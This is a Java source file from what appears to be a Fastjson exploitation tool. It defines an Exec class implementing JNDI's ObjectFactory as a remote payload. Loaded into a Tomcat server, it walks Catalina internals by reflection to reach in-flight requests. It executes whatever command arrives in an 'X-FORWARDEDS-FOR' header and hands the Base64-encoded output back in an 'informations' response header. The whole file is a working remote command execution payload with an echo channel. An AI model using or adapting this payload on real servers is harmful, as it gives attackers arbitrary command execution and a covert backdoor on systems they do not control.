package com.fastjsontool.exploit.payload;

import org.apache.catalina.connector.Connector;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardService;
import org.apache.coyote.RequestInfo;
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.Base64;
import java.util.Hashtable;

public class Exec implements ObjectFactory {
    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {
        org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
        org.apache.catalina.connector.Response response = null;
        try {
            Field context = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context");
            context.setAccessible(true);
            ApplicationContext ApplicationContext = (ApplicationContext) context.get(standardContext);
            Field service = Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredField("service");
            service.setAccessible(true);
            StandardService standardService = (StandardService) service.get(ApplicationContext);
            Field connectors = Class.forName("org.apache.catalina.core.StandardService").getDeclaredField("connectors");
            connectors.setAccessible(true);
            Connector[] connector = (Connector[]) connectors.get(standardService);
            Field protocolHandler = Class.forName("org.apache.catalina.connector.Connector").getDeclaredField("protocolHandler");
            protocolHandler.setAccessible(true);
            Class<?>[] AbstractProtocol_list = Class.forName("org.apache.coyote.AbstractProtocol").getDeclaredClasses();
            for (Class<?> aClass : AbstractProtocol_list) {
                if (aClass.getName().length() == 52) {
                    java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod("getHandler", null);
                    getHandlerMethod.setAccessible(true);
                    Field globalField = aClass.getDeclaredField("global");
                    globalField.setAccessible(true);
                    org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(getHandlerMethod.invoke(connector[0].getProtocolHandler(), null));
                    Field processors = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
                    processors.setAccessible(true);
                    java.util.List<RequestInfo> RequestInfo_list = (java.util.List<RequestInfo>) processors.get(requestGroupInfo);
                    Field req = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
                    req.setAccessible(true);
                    for (RequestInfo requestInfo : RequestInfo_list) {
                        org.apache.coyote.Request request1 = (org.apache.coyote.Request) req.get(requestInfo);
                        org.apache.catalina.connector.Request request2 = (org.apache.catalina.connector.Request) request1.getNote(1);
                        response = request2.getResponse();
                        String header = null;
                        try {
                            header = request2.getHeader("X-FORWARDEDS-FOR");
                        }catch (Exception e){
                            header = "informations";
                        }
                        if (!header.equals("informations") && !header.equals("")) {
                            byte[] encode;
                            try {
                                Runtime runtime = Runtime.getRuntime();
                                String[] commonds = header.split("\\s+");
                                Process exec = runtime.exec(commonds);
                                exec.waitFor();
                                InputStream inputStream = exec.getInputStream();
                                byte[] bytes = new byte[1024];
                                int len = 0;
                                ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
                                while ((len = inputStream.read(bytes)) != -1) {
                                    outputStream.write(bytes, 0, len);
                                }
                                encode = Base64.getEncoder().encode(outputStream.toByteArray());
                                if (encode.length > 0) {
                                    response.setHeader("informations", new String(encode));
                                }else{
                                    response.setHeader("informations", "execError");
                                }
                            } catch (Exception e) {
                                response.setHeader("informations", "execError");
                            }
                        } else {
                            response.setHeader("informations", "fastjson");
                        }
                    }
                }
            }
        } catch (NoSuchFieldException | InvocationTargetException | IllegalAccessException | NoSuchMethodException | ClassNotFoundException e) {
            e.printStackTrace();
        }
        return null;
    }
}
